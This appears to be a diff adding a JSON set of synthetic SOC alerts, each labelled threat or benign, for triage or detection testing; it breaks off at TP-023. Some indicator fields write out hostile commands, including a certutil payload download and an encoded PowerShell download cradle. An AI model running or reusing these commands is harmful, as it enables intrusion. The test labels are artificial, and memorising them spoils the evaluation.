@@ -1,0 +1,965 @@
+[
+  {
+    "id": "TP-001",
+    "type": "c2_beacon",
+    "label": "threat",
+    "severity": "critical",
+    "description": "Periodic HTTPS beaconing detected from workstation to known Cobalt Strike C2 infrastructure. Connections occur every 60 seconds with jitter, transferring small encoded payloads.",
+    "indicators": {
+      "src_ip": "10.12.5.34",
+      "dst_ip": "185.220.101.42",
+      "dst_domain": "cdn-update.systemcheck[.]xyz",
+      "interval_seconds": 60,
+      "jitter_pct": 15,
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "dst_port": 443,
+      "payload_size_bytes": 256,
+      "process": "rundll32.exe",
+      "hostname": "WS-FIN-019",
+      "user": "CORP\\m.anderson"
+    }
+  },
+  {
+    "id": "TP-002",
+    "type": "c2_beacon",
+    "label": "threat",
+    "severity": "critical",
+    "description": "DNS-based C2 channel detected. Host is issuing high-frequency TXT record queries to a suspicious domain with encoded subdomains consistent with data tunneling.",
+    "indicators": {
+      "src_ip": "10.12.8.107",
+      "dst_ip": "198.51.100.23",
+      "dst_domain": "a3f2b1c9.ns1.dnsresolv[.]net",
+      "query_type": "TXT",
+      "queries_per_minute": 45,
+      "process": "svchost.exe",
+      "parent_process": "powershell.exe",
+      "hostname": "WS-DEV-042",
+      "user": "CORP\\j.chen",
+      "encoded_subdomain_sample": "aGVsbG8gd29ybGQ.ns1.dnsresolv[.]net"
+    }
+  },
+  {
+    "id": "TP-003",
+    "type": "c2_beacon",
+    "label": "threat",
+    "severity": "high",
+    "description": "Sliver C2 implant communication detected over HTTP. Workstation making POST requests with base64-encoded body to a recently registered domain hosted on bulletproof infrastructure.",
+    "indicators": {
+      "src_ip": "10.12.3.88",
+      "dst_ip": "91.215.85.17",
+      "dst_domain": "api.microsft-update[.]com",
+      "dst_port": 8443,
+      "method": "POST",
+      "content_type": "application/octet-stream",
+      "interval_seconds": 30,
+      "domain_age_days": 3,
+      "process": "notepad.exe",
+      "hostname": "WS-HR-005",
+      "user": "CORP\\l.martinez"
+    }
+  },
+  {
+    "id": "FP-001",
+    "type": "c2_beacon",
+    "label": "benign",
+    "severity": "medium",
+    "description": "Periodic HTTPS connections detected from multiple workstations to external endpoint at regular intervals. Traffic analysis shows consistent 60-second intervals with small payloads — consistent with beaconing pattern.",
+    "indicators": {
+      "src_ip": "10.12.6.15",
+      "dst_ip": "142.250.185.206",
+      "dst_domain": "update.googleapis.com",
+      "interval_seconds": 60,
+      "dst_port": 443,
+      "payload_size_bytes": 512,
+      "process": "GoogleUpdate.exe",
+      "hostname": "WS-MKT-011",
+      "user": "CORP\\s.taylor",
+      "explanation": "Google Chrome auto-update service performing scheduled update checks"
+    }
+  },
+  {
+    "id": "FP-002",
+    "type": "c2_beacon",
+    "label": "benign",
+    "severity": "low",
+    "description": "Workstation generating periodic HTTPS connections to Microsoft infrastructure every 30 seconds. Pattern resembles C2 beaconing with consistent intervals and small encoded payloads.",
+    "indicators": {
+      "src_ip": "10.12.4.92",
+      "dst_ip": "13.107.4.50",
+      "dst_domain": "settings-win.data.microsoft.com",
+      "interval_seconds": 30,
+      "dst_port": 443,
+      "process": "svchost.exe",
+      "parent_process": "services.exe",
+      "hostname": "WS-ACCT-023",
+      "user": "NT AUTHORITY\\SYSTEM",
+      "explanation": "Windows Update service telemetry and update check traffic"
+    }
+  },
+  {
+    "id": "TP-004",
+    "type": "brute_force",
+    "label": "threat",
+    "severity": "critical",
+    "description": "High-velocity credential stuffing attack against VPN portal. Over 2,400 failed login attempts in 10 minutes from a single external IP using a rotating list of usernames, followed by 3 successful authentications.",
+    "indicators": {
+      "src_ip": "103.136.42.78",
+      "target": "vpn.corpnet.com",
+      "dst_port": 443,
+      "failed_attempts": 2437,
+      "successful_attempts": 3,
+      "time_window_minutes": 10,
+      "unique_usernames": 812,
+      "compromised_accounts": ["CORP\\r.johnson", "CORP\\a.williams", "CORP\\d.lee"],
+      "geo_location": "Lagos, Nigeria",
+      "service": "Cisco AnyConnect"
+    }
+  },
+  {
+    "id": "TP-005",
+    "type": "brute_force",
+    "label": "threat",
+    "severity": "high",
+    "description": "Distributed password spraying attack against Exchange OWA. Multiple source IPs attempting a small set of common passwords across hundreds of accounts over 4 hours.",
+    "indicators": {
+      "src_ips": ["45.33.49.12", "45.33.49.13", "45.33.49.14", "45.33.49.15"],
+      "target": "mail.corpnet.com",
+      "dst_port": 443,
+      "failed_attempts": 890,
+      "successful_attempts": 7,
+      "time_window_minutes": 240,
+      "unique_usernames": 445,
+      "passwords_per_user": 2,
+      "service": "Exchange OWA",
+      "compromised_accounts": ["CORP\\t.nguyen", "CORP\\b.patel"]
+    }
+  },
+  {
+    "id": "TP-006",
+    "type": "brute_force",
+    "label": "threat",
+    "severity": "high",
+    "description": "RDP brute force from internal compromised host targeting domain controllers. Single workstation generating thousands of authentication failures against NTLM over SMB.",
+    "indicators": {
+      "src_ip": "10.12.9.201",
+      "dst_ips": ["10.12.1.10", "10.12.1.11"],
+      "dst_port": 3389,
+      "failed_attempts": 3200,
+      "successful_attempts": 1,
+      "time_window_minutes": 30,
+      "target_accounts": ["CORP\\Administrator", "CORP\\domain_admin", "CORP\\svc_backup"],
+      "hostname": "WS-IT-031",
+      "process": "mstsc.exe",
+      "service": "RDP"
+    }
+  },
+  {
+    "id": "FP-003",
+    "type": "brute_force",
+    "label": "benign",
+    "severity": "medium",
+    "description": "Multiple rapid authentication failures detected from single internal IP against SSO portal. 47 failed logins in 3 minutes for the same user account followed by a successful login.",
+    "indicators": {
+      "src_ip": "10.12.7.55",
+      "target": "sso.corpnet.com",
+      "dst_port": 443,
+      "failed_attempts": 47,
+      "successful_attempts": 1,
+      "time_window_minutes": 3,
+      "unique_usernames": 1,
+      "target_account": "CORP\\k.wong",
+      "service": "Okta SSO",
+      "explanation": "User's password manager (1Password) auto-filling expired cached credentials before manual password update"
+    }
+  },
+  {
+    "id": "FP-004",
+    "type": "brute_force",
+    "label": "benign",
+    "severity": "low",
+    "description": "Automated authentication failure spike detected against service accounts. 120 failed Kerberos authentications per minute for 3 service accounts from application servers.",
+    "indicators": {
+      "src_ips": ["10.12.20.5", "10.12.20.6", "10.12.20.7"],
+      "dst_ip": "10.12.1.10",
+      "dst_port": 88,
+      "failed_attempts": 360,
+      "time_window_minutes": 3,
+      "target_accounts": ["CORP\\svc_jenkins", "CORP\\svc_deploy", "CORP\\svc_monitor"],
+      "service": "Kerberos",
+      "explanation": "Service account password rotation by IT — Group Policy pushed new passwords but app configs not yet updated"
+    }
+  },
+  {
+    "id": "TP-007",
+    "type": "phishing",
+    "label": "threat",
+    "severity": "critical",
+    "description": "Targeted spear phishing email with malicious macro-enabled attachment delivered to 5 Finance department users. Sender domain uses homoglyph substitution to impersonate CFO.",
+    "indicators": {
+      "sender": "cfo@corp-net.com",
+      "impersonated": "cfo@corpnet.com",
+      "recipients": ["CORP\\a.garcia", "CORP\\p.kumar", "CORP\\m.smith", "CORP\\j.brown", "CORP\\c.davis"],
+      "subject": "Q4 Budget Revision - Urgent Action Required",
+      "attachment_name": "Q4_Budget_Revision_Final.xlsm",
+      "attachment_hash_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "macro_detected": true,
+      "urls_in_body": ["https://corpnet-sharepoint[.]com/auth/login"],
+      "spf_result": "fail",
+      "dkim_result": "none",
+      "x_originating_ip": "185.174.137.42"
+    }
+  },
+  {
+    "id": "TP-008",
+    "type": "phishing",
+    "label": "threat",
+    "severity": "high",
+    "description": "Credential harvesting campaign targeting IT department. Emails contain links to fake Microsoft 365 login page hosted on compromised WordPress site. Two users have submitted credentials.",
+    "indicators": {
+      "sender": "no-reply@m1crosoft-365.com",
+      "recipients_count": 23,
+      "department": "IT",
+      "subject": "Action Required: Verify Your Microsoft 365 Account",
+      "urls_in_body": ["https://wpsitehost[.]com/wp-content/uploads/ms365/login.php"],
+      "domain_age_days": 12,
+      "credentials_submitted_by": ["CORP\\n.pham", "CORP\\r.singh"],
+      "spf_result": "fail",
+      "reply_to": "support@m1crosoft-365.com",
+      "x_originating_ip": "194.163.44.91"
+    }
+  },
+  {
+    "id": "TP-009",
+    "type": "phishing",
+    "label": "threat",
+    "severity": "high",
+    "description": "QR code phishing (quishing) campaign delivered via email. Email impersonates HR department requesting employees scan QR code for benefits enrollment. QR code resolves to credential harvesting page.",
+    "indicators": {
+      "sender": "hr-benefits@corpnet-hr[.]org",
+      "impersonated": "hr@corpnet.com",
+      "recipients_count": 150,
+      "subject": "Open Enrollment 2026 - Scan QR Code to Enroll",
+      "qr_code_url": "https://benefits-corpnet[.]com/enroll",
+      "attachment_name": "Benefits_Enrollment_2026.pdf",
+      "attachment_hash_sha256": "7d865e959b2466918c9863afca942d0fb89d7c9ac0c99bafc3749504ded97730",
+      "spf_result": "none",
+      "dkim_result": "fail"
+    }
+  },
+  {
+    "id": "FP-005",
+    "type": "phishing",
+    "label": "benign",
+    "severity": "medium",
+    "description": "Bulk email flagged as potential phishing. External sender with marketing domain sending identical content to 200+ employees. Contains tracking pixels and external links.",
+    "indicators": {
+      "sender": "campaigns@hubspot.corpnet-marketing.com",
+      "recipients_count": 215,
+      "subject": "Your Exclusive Invite: 2026 Industry Summit",
+      "urls_in_body": ["https://events.corpnet-marketing.com/summit2026", "https://track.hubspot.com/e/click/abc123"],
+      "tracking_pixels": 3,
+      "spf_result": "pass",
+      "dkim_result": "pass",
+      "dmarc_result": "pass",
+      "explanation": "Legitimate marketing email from company's HubSpot-integrated marketing platform for annual industry conference"
+    }
+  },
+  {
+    "id": "FP-006",
+    "type": "phishing",
+    "label": "benign",
+    "severity": "low",
+    "description": "Email with external links flagged by DLP. HR vendor sending benefits enrollment links to all employees. SPF/DKIM/DMARC all pass, domain registered 4 years ago.",
+    "indicators": {
+      "sender": "notifications@benefitfocus.com",
+      "recipients_count": 500,
+      "subject": "Action Required: Complete Your 2026 Benefits Enrollment",
+      "urls_in_body": ["https://corpnet.benefitfocus.com/enroll", "https://corpnet.benefitfocus.com/help"],
+      "domain_age_days": 1460,
+      "spf_result": "pass",
+      "dkim_result": "pass",
+      "dmarc_result": "pass",
+      "explanation": "Authorized HR benefits vendor (BenefitFocus) sending legitimate annual enrollment notifications"
+    }
+  },
+  {
+    "id": "TP-010",
+    "type": "lateral_movement",
+    "label": "threat",
+    "severity": "critical",
+    "description": "Pass-the-hash attack detected. Compromised workstation using harvested NTLM hashes to authenticate to multiple servers via SMB. Accessing ADMIN$ shares on 12 hosts within 5 minutes.",
+    "indicators": {
+      "src_ip": "10.12.5.88",
+      "dst_ips": ["10.12.20.10", "10.12.20.11", "10.12.20.12", "10.12.20.15", "10.12.20.20"],
+      "dst_port": 445,
+      "protocol": "SMB",
+      "logon_type": 3,
+      "auth_package": "NTLM",
+      "shares_accessed": ["\\\\SRV-DB-01\\ADMIN$", "\\\\SRV-APP-02\\ADMIN$", "\\\\SRV-FILE-01\\C$"],
+      "hosts_touched": 12,
+      "time_window_minutes": 5,
+      "hostname": "WS-DEV-017",
+      "user": "CORP\\local_admin",
+      "process": "cmd.exe"
+    }
+  },
+  {
+    "id": "TP-011",
+    "type": "lateral_movement",
+    "label": "threat",
+    "severity": "critical",
+    "description": "WMI-based lateral movement detected. Attacker using compromised domain admin credentials to execute remote commands on servers via WMI. Deploying secondary payload to multiple hosts.",
+    "indicators": {
+      "src_ip": "10.12.9.201",
+      "dst_ips": ["10.12.20.30", "10.12.20.31", "10.12.20.32"],
+      "dst_port": 135,
+      "protocol": "WMI",
+      "process": "wmiprvse.exe",
+      "parent_process": "svchost.exe",
+      "commands_executed": ["cmd.exe /c certutil -urlcache -split -f http://10.12.9.201/payload.exe C:\\Windows\\Temp\\svc.exe", "cmd.exe /c C:\\Windows\\Temp\\svc.exe"],
+      "hostname": "WS-IT-031",
+      "user": "CORP\\domain_admin",
+      "time_window_minutes": 8
+    }
+  },
+  {
+    "id": "TP-012",
+    "type": "lateral_movement",
+    "label": "threat",
+    "severity": "high",
+    "description": "PSExec lateral movement detected. Remote service creation and execution observed from a single source host to multiple targets. PSEXESVC service installed on target machines.",
+    "indicators": {
+      "src_ip": "10.12.3.44",
+      "dst_ips": ["10.12.20.40", "10.12.20.41", "10.12.20.42"],
+      "dst_port": 445,
+      "protocol": "SMB",
+      "service_name": "PSEXESVC",
+      "process": "PSEXESVC.exe",
+      "pipe_name": "\\\\pipe\\PSEXESVC",
+      "hostname": "WS-SEC-008",
+      "user": "CORP\\svc_deploy",
+      "event_id": 7045,
+      "time_window_minutes": 15
+    }
+  },
+  {
+    "id": "FP-007",
+    "type": "lateral_movement",
+    "label": "benign",
+    "severity": "medium",
+    "description": "SSH connections from single internal host to 15 servers in rapid succession. Authentication uses key-based auth. Source IP belongs to CI/CD build server making deployment connections.",
+    "indicators": {
+      "src_ip": "10.12.30.5",
+      "dst_ips": ["10.12.20.50", "10.12.20.51", "10.12.20.52", "10.12.20.53", "10.12.20.54"],
+      "dst_port": 22,
+      "protocol": "SSH",
+      "auth_method": "publickey",
+      "hosts_touched": 15,
+      "time_window_minutes": 3,
+      "hostname": "SRV-JENKINS-01",
+      "user": "CORP\\svc_jenkins",
+      "process": "ssh",
+      "explanation": "Jenkins CI/CD pipeline executing automated deployment to staging environment via Ansible playbook"
+    }
+  },
+  {
+    "id": "FP-008",
+    "type": "lateral_movement",
+    "label": "benign",
+    "severity": "low",
+    "description": "WinRM connections detected from IT admin workstation to 8 servers. PowerShell remoting sessions established using domain admin credentials during maintenance window.",
+    "indicators": {
+      "src_ip": "10.12.2.15",
+      "dst_ips": ["10.12.20.60", "10.12.20.61", "10.12.20.62", "10.12.20.63"],
+      "dst_port": 5985,
+      "protocol": "WinRM",
+      "hosts_touched": 8,
+      "time_window_minutes": 45,
+      "hostname": "WS-ITADMIN-03",
+      "user": "CORP\\admin.j.roberts",
+      "process": "wsmprovhost.exe",
+      "change_ticket": "CHG-2026-0342",
+      "explanation": "Authorized IT administrator performing scheduled Windows Server patching during approved maintenance window"
+    }
+  },
+  {
+    "id": "TP-013",
+    "type": "malware",
+    "label": "threat",
+    "severity": "critical",
+    "description": "Ransomware execution detected. Process encrypting files across network shares with .locked extension. Ransom note dropped in every directory. Volume shadow copies deleted.",
+    "indicators": {
+      "src_ip": "10.12.5.34",
+      "process": "svchst.exe",
+      "parent_process": "explorer.exe",
+      "file_path": "C:\\Users\\m.anderson\\AppData\\Local\\Temp\\svchst.exe",
+      "file_hash_sha256": "a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456",
+      "files_encrypted": 4200,
+      "extension_added": ".locked",
+      "ransom_note": "README_UNLOCK.txt",
+      "vss_deleted": true,
+      "registry_persistence": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate",
+      "hostname": "WS-FIN-019",
+      "user": "CORP\\m.anderson"
+    }
+  },
+  {
+    "id": "TP-014",
+    "type": "malware",
+    "label": "threat",
+    "severity": "critical",
+    "description": "Emotet dropper detected. Macro-enabled document spawned PowerShell which downloaded and executed secondary payload. Process hollowing observed in svchost.exe.",
+    "indicators": {
+      "src_ip": "10.12.6.77",
+      "process": "powershell.exe",
+      "parent_process": "WINWORD.EXE",
+      "command_line": "powershell -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADQALgAxADYAMwAuADQANAAuADkAMQAvAHUAcABkAGEAdABlAC4AcABzADEAJwApAA==",
+      "download_url": "http://194.163.44.91/update.ps1",
+      "dropped_file": "C:\\ProgramData\\svchost32.dll",
+      "dropped_hash_sha256": "b2c3d4e5f6a789012345678901234567890abcdef1234567890abcdef1234567",
+      "hostname": "WS-SALES-033",
+      "user": "CORP\\t.brooks",
+      "hollowed_process": "svchost.exe"
+    }
+  },
+  {
+    "id": "TP-015",
+    "type": "malware",
+    "label": "threat",
+    "severity": "high",
+    "description": "Keylogger malware detected. Unknown process capturing keystrokes and writing to hidden log file. Process injected into explorer.exe, sending captured data to external server every 5 minutes.",
+    "indicators": {
+      "src_ip": "10.12.8.22",
+      "dst_ip": "45.77.65.211",
+      "process": "explorer.exe",
+      "injected_dll": "C:\\Windows\\Temp\\mscore.dll",
+      "dll_hash_sha256": "c3d4e5f6a7b8901234567890abcdef1234567890abcdef1234567890abcdef12",
+      "log_file": "C:\\Users\\d.kim\\AppData\\Local\\Temp\\.klog.dat",
+      "exfil_interval_minutes": 5,
+      "exfil_dst": "https://data-collect[.]xyz/api/submit",
+      "hostname": "WS-EXEC-002",
+      "user": "CORP\\d.kim",
+      "api_hooks": ["SetWindowsHookExA", "GetAsyncKeyState"]
+    }
+  },
+  {
+    "id": "FP-009",
+    "type": "malware",
+    "label": "benign",
+    "severity": "medium",
+    "description": "Endpoint protection flagged suspicious DLL injection in browser process. chrome.exe loading non-standard DLL from AppData. DLL modifies network traffic patterns.",
+    "indicators": {
+      "src_ip": "10.12.7.90",
+      "process": "chrome.exe",
+      "dll_path": "C:\\Users\\r.jones\\AppData\\Local\\Grammarly\\Grammarly for Chrome\\grammarly_native.dll",
+      "dll_hash_sha256": "d4e5f6a7b8c9012345678901234567890abcdef1234567890abcdef12345678",
+      "dll_signed": true,
+      "signer": "Grammarly, Inc.",
+      "hostname": "WS-MKT-022",
+      "user": "CORP\\r.jones",
+      "explanation": "Grammarly browser extension native messaging host DLL — approved enterprise software"
+    }
+  },
+  {
+    "id": "FP-010",
+    "type": "malware",
+    "label": "benign",
+    "severity": "medium",
+    "description": "Heuristic detection triggered by executable modifying system files and registry keys. Process performing bulk file operations with elevated privileges across system directories.",
+    "indicators": {
+      "src_ip": "10.12.4.18",
+      "process": "TrustedInstaller.exe",
+      "parent_process": "svchost.exe",
+      "files_modified": 380,
+      "registry_keys_modified": 125,
+      "directories": ["C:\\Windows\\WinSxS", "C:\\Windows\\System32"],
+      "hostname": "WS-ACCT-007",
+      "user": "NT AUTHORITY\\SYSTEM",
+      "windows_update_kb": "KB5034441",
+      "explanation": "Windows Update Trusted Installer applying cumulative security update KB5034441"
+    }
+  },
+  {
+    "id": "TP-016",
+    "type": "data_exfiltration",
+    "label": "threat",
+    "severity": "critical",
+    "description": "Large-scale data exfiltration via HTTPS. Workstation uploaded 4.7 GB to anonymous file sharing service over 2 hours. User accessed sensitive file shares immediately prior to upload.",
+    "indicators": {
+      "src_ip": "10.12.5.103",
+      "dst_ip": "104.21.45.67",
+      "dst_domain": "mega.nz",
+      "dst_port": 443,
+      "bytes_sent": 5046586573,
+      "duration_minutes": 120,
+      "process": "chrome.exe",
+      "files_accessed_prior": ["\\\\SRV-FILE-01\\Finance\\Q4_Results_2025.xlsx", "\\\\SRV-FILE-01\\Finance\\M&A_Pipeline.docx", "\\\\SRV-FILE-01\\HR\\Employee_Salaries_2026.csv"],
+      "hostname": "WS-FIN-041",
+      "user": "CORP\\e.foster",
+      "notice_period": true
+    }
+  },
+  {
+    "id": "TP-017",
+    "type": "data_exfiltration",
+    "label": "threat",
+    "severity": "high",
+    "description": "DNS exfiltration tunnel detected. Anomalous volume of DNS queries with encoded data in subdomain labels. Total estimated data exfiltrated: 850 MB over 6 hours via DNS TXT records.",
+    "indicators": {
+      "src_ip": "10.12.9.44",
+      "dst_ip": "198.51.100.23",
+      "dst_domain": "exfil.datapipe[.]xyz",
+      "protocol": "DNS",
+      "query_types": ["TXT", "CNAME"],
+      "queries_total": 125000,
+      "estimated_bytes_exfil": 891289600,
+      "duration_hours": 6,
+      "avg_subdomain_length": 55,
+      "process": "dnscat2.exe",
+      "hostname": "WS-DEV-055",
+      "user": "CORP\\v.petrov"
+    }
+  },
+  {
+    "id": "FP-011",
+    "type": "data_exfiltration",
+    "label": "benign",
+    "severity": "medium",
+    "description": "Abnormal outbound data transfer detected. Server uploading 12 GB to external cloud storage endpoint over 3 hours. Sustained high-bandwidth HTTPS connection to AWS S3.",
+    "indicators": {
+      "src_ip": "10.12.20.70",
+      "dst_ip": "52.216.165.69",
+      "dst_domain": "corpnet-backups.s3.us-east-1.amazonaws.com",
+      "dst_port": 443,
+      "bytes_sent": 12884901888,
+      "duration_minutes": 180,
+      "process": "veeam.backup.agent.exe",
+      "hostname": "SRV-BACKUP-01",
+      "user": "CORP\\svc_backup",
+      "explanation": "Veeam backup agent performing scheduled nightly offsite backup to company's AWS S3 bucket"
+    }
+  },
+  {
+    "id": "FP-012",
+    "type": "data_exfiltration",
+    "label": "benign",
+    "severity": "low",
+    "description": "DLP alert triggered by large file upload. User sending 2.1 GB archive to external cloud service. Sustained upload to OneDrive for Business.",
+    "indicators": {
+      "src_ip": "10.12.3.67",
+      "dst_ip": "13.107.42.12",
+      "dst_domain": "corpnet-my.sharepoint.com",
+      "dst_port": 443,
+      "bytes_sent": 2254857830,
+      "duration_minutes": 25,
+      "process": "OneDrive.exe",
+      "hostname": "WS-ENG-014",
+      "user": "CORP\\h.nakamura",
+      "explanation": "Engineer syncing large project repository to corporate OneDrive for Business — approved by data classification policy"
+    }
+  },
+  {
+    "id": "FP-013",
+    "type": "data_exfiltration",
+    "label": "benign",
+    "severity": "low",
+    "description": "Outbound data spike detected from development server. 8 GB transferred to external registry over 90 minutes. Traffic is container image pushes to company's container registry.",
+    "indicators": {
+      "src_ip": "10.12.30.8",
+      "dst_ip": "34.86.33.21",
+      "dst_domain": "us-docker.pkg.dev",
+      "dst_port": 443,
+      "bytes_sent": 8589934592,
+      "duration_minutes": 90,
+      "process": "dockerd",
+      "hostname": "SRV-CI-02",
+      "user": "CORP\\svc_jenkins",
+      "explanation": "CI/CD pipeline pushing newly built Docker images to Google Artifact Registry as part of release process"
+    }
+  },
+  {
+    "id": "TP-018",
+    "type": "privilege_escalation",
+    "label": "threat",
+    "severity": "critical",
+    "description": "Kerberoasting attack detected. Service ticket requests for multiple SPNs from a single workstation using RC4 encryption. Offline cracking of service account passwords suspected.",
+    "indicators": {
+      "src_ip": "10.12.9.201",
+      "dst_ip": "10.12.1.10",
+      "spns_requested": ["MSSQLSvc/sql01.corpnet.com:1433", "HTTP/exchange.corpnet.com", "CIFS/fileserver.corpnet.com", "MSSQLSvc/sql02.corpnet.com:1433"],
+      "encryption_type": "RC4_HMAC_MD5",
+      "event_id": 4769,
+      "ticket_requests": 23,
+      "time_window_minutes": 2,
+      "tool_detected": "Rubeus",
+      "hostname": "WS-IT-031",
+      "user": "CORP\\j.chen"
+    }
+  },
+  {
+    "id": "TP-019",
+    "type": "privilege_escalation",
+    "label": "threat",
+    "severity": "critical",
+    "description": "Token impersonation and privilege escalation via PrintSpoofer exploit. Low-privilege service account escalated to SYSTEM on web server. Named pipe impersonation detected.",
+    "indicators": {
+      "src_ip": "10.12.20.45",
+      "initial_user": "CORP\\svc_webapp",
+      "escalated_to": "NT AUTHORITY\\SYSTEM",
+      "process": "PrintSpoofer64.exe",
+      "parent_process": "w3wp.exe",
+      "technique": "Named Pipe Impersonation",
+      "exploit": "PrintSpoofer (CVE-2020-1048)",
+      "hostname": "SRV-WEB-03",
+      "event_id": 4672,
+      "privileges_gained": ["SeDebugPrivilege", "SeImpersonatePrivilege", "SeTcbPrivilege"]
+    }
+  },
+  {
+    "id": "FP-014",
+    "type": "privilege_escalation",
+    "label": "benign",
+    "severity": "medium",
+    "description": "Privilege elevation detected. Service account granted SeDebugPrivilege and added to local Administrators group on 5 servers simultaneously.",
+    "indicators": {
+      "src_ip": "10.12.2.15",
+      "target_account": "CORP\\svc_monitoring",
+      "privileges_added": ["SeDebugPrivilege", "SeBackupPrivilege"],
+      "group_added": "BUILTIN\\Administrators",
+      "servers_affected": ["SRV-APP-01", "SRV-APP-02", "SRV-APP-03", "SRV-APP-04", "SRV-APP-05"],
+      "event_id": 4728,
+      "hostname": "DC-01",
+      "changed_by": "CORP\\admin.j.roberts",
+      "change_ticket": "CHG-2026-0398",
+      "explanation": "IT admin adding monitoring service account to Administrators group per approved change ticket for Datadog agent deployment"
+    }
+  },
+  {
+    "id": "FP-015",
+    "type": "privilege_escalation",
+    "label": "benign",
+    "severity": "low",
+    "description": "UAC bypass attempt detected. Process requesting elevated privileges through auto-elevation of trusted Microsoft binaries. Multiple elevation prompts from single workstation.",
+    "indicators": {
+      "src_ip": "10.12.2.33",
+      "process": "mmc.exe",
+      "parent_process": "explorer.exe",
+      "elevation_count": 12,
+      "time_window_minutes": 30,
+      "hostname": "WS-ITADMIN-05",
+      "user": "CORP\\admin.s.wilson",
+      "elevated_processes": ["mmc.exe", "services.msc", "compmgmt.msc", "devmgmt.msc"],
+      "explanation": "IT administrator using Microsoft Management Console snap-ins for routine server management tasks"
+    }
+  },
+  {
+    "id": "FP-016",
+    "type": "privilege_escalation",
+    "label": "benign",
+    "severity": "low",
+    "description": "Suspicious token manipulation detected. Process creating tokens with elevated privileges using LogonUser API. Multiple SYSTEM-level tokens generated from service process.",
+    "indicators": {
+      "src_ip": "10.12.20.80",
+      "process": "sqlservr.exe",
+      "parent_process": "services.exe",
+      "token_type": "Impersonation",
+      "impersonation_level": "SecurityDelegation",
+      "tokens_created": 45,
+      "time_window_minutes": 60,
+      "hostname": "SRV-SQL-01",
+      "user": "CORP\\svc_mssql",
+      "explanation": "SQL Server service impersonating connected users for row-level security enforcement — normal RDBMS behavior"
+    }
+  },
+  {
+    "id": "TP-020",
+    "type": "reconnaissance",
+    "label": "threat",
+    "severity": "high",
+    "description": "Active Directory enumeration detected. BloodHound/SharpHound data collection observed from compromised workstation. LDAP queries enumerating all users, groups, sessions, and ACLs.",
+    "indicators": {
+      "src_ip": "10.12.9.201",
+      "dst_ip": "10.12.1.10",
+      "dst_port": 389,
+      "protocol": "LDAP",
+      "queries_total": 8500,
+      "time_window_minutes": 15,
+      "tool_detected": "SharpHound",
+      "data_collected": ["users", "groups", "sessions", "acls", "trusts", "containers"],
+      "process": "SharpHound.exe",
+      "hostname": "WS-IT-031",
+      "user": "CORP\\j.chen",
+      "output_file": "20260310120000_BloodHound.zip"
+    }
+  },
+  {
+    "id": "TP-021",
+    "type": "reconnaissance",
+    "label": "threat",
+    "severity": "high",
+    "description": "Network reconnaissance and port scanning from internal host. Sequential SYN scans across entire /24 subnet targeting common service ports. Consistent with Nmap SYN scan pattern.",
+    "indicators": {
+      "src_ip": "10.12.5.34",
+      "dst_subnet": "10.12.20.0/24",
+      "ports_scanned": [22, 80, 135, 139, 443, 445, 1433, 3306, 3389, 5432, 5985, 8080, 8443],
+      "hosts_scanned": 254,
+      "scan_type": "SYN",
+      "time_window_minutes": 8,
+      "open_ports_found": 47,
+      "process": "nmap.exe",
+      "hostname": "WS-FIN-019",
+      "user": "CORP\\m.anderson"
+    }
+  },
+  {
+    "id": "FP-017",
+    "type": "reconnaissance",
+    "label": "benign",
+    "severity": "medium",
+    "description": "Port scanning activity detected from security team subnet. Comprehensive TCP/UDP scan of production network targeting all 65535 ports on multiple hosts.",
+    "indicators": {
+      "src_ip": "10.12.50.10",
+      "dst_subnet": "10.12.20.0/24",
+      "ports_scanned": "1-65535",
+      "hosts_scanned": 254,
+      "scan_type": "SYN+UDP",
+      "time_window_minutes": 120,
+      "process": "nessus",
+      "hostname": "SRV-VULN-SCAN-01",
+      "user": "CORP\\svc_nessus",
+      "scan_policy": "PCI-DSS Quarterly Scan",
+      "explanation": "Tenable Nessus vulnerability scanner performing scheduled PCI-DSS quarterly compliance scan"
+    }
+  },
+  {
+    "id": "FP-018",
+    "type": "reconnaissance",
+    "label": "benign",
+    "severity": "low",
+    "description": "LDAP enumeration spike detected. Single host performing thousands of LDAP queries against domain controller, enumerating user objects and group memberships.",
+    "indicators": {
+      "src_ip": "10.12.30.12",
+      "dst_ip": "10.12.1.10",
+      "dst_port": 389,
+      "protocol": "LDAP",
+      "queries_total": 5200,
+      "time_window_minutes": 10,
+      "process": "CrowdStrike.Sensor.exe",
+      "hostname": "SRV-EDR-01",
+      "user": "CORP\\svc_crowdstrike",
+      "explanation": "CrowdStrike Falcon sensor performing scheduled Active Directory identity threat detection baseline scan"
+    }
+  },
+  {
+    "id": "FP-019",
+    "type": "reconnaissance",
+    "label": "benign",
+    "severity": "low",
+    "description": "Network discovery activity from IT admin workstation. ARP scans and ICMP sweeps across multiple subnets during business hours. SNMP queries to network devices.",
+    "indicators": {
+      "src_ip": "10.12.2.20",
+      "dst_subnets": ["10.12.5.0/24", "10.12.6.0/24", "10.12.7.0/24", "10.12.8.0/24"],
+      "protocols": ["ARP", "ICMP", "SNMP"],
+      "hosts_discovered": 312,
+      "time_window_minutes": 45,
+      "process": "SolarWinds.NetworkDiscovery.exe",
+      "hostname": "WS-NETADMIN-01",
+      "user": "CORP\\admin.m.chang",
+      "explanation": "SolarWinds network discovery module performing scheduled asset inventory refresh for CMDB"
+    }
+  },
+  {
+    "id": "TP-022",
+    "type": "persistence",
+    "label": "threat",
+    "severity": "critical",
+    "description": "Malicious scheduled task created for persistence. Task set to run at system startup executing encoded PowerShell from hidden directory. Task name mimics legitimate Windows task.",
+    "indicators": {
+      "src_ip": "10.12.5.34",
+      "task_name": "\\Microsoft\\Windows\\WindowsUpdate\\sihclient",
+      "action": "powershell.exe -WindowStyle Hidden -enc JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
+      "trigger": "AtStartup",
+      "run_level": "Highest",
+      "file_path": "C:\\Windows\\Temp\\.cache\\updater.ps1",
+      "process": "schtasks.exe",
+      "parent_process": "cmd.exe",
+      "hostname": "WS-FIN-019",
+      "user": "CORP\\m.anderson",
+      "event_id": 4698
+    }
+  },
+  {
+    "id": "TP-023",
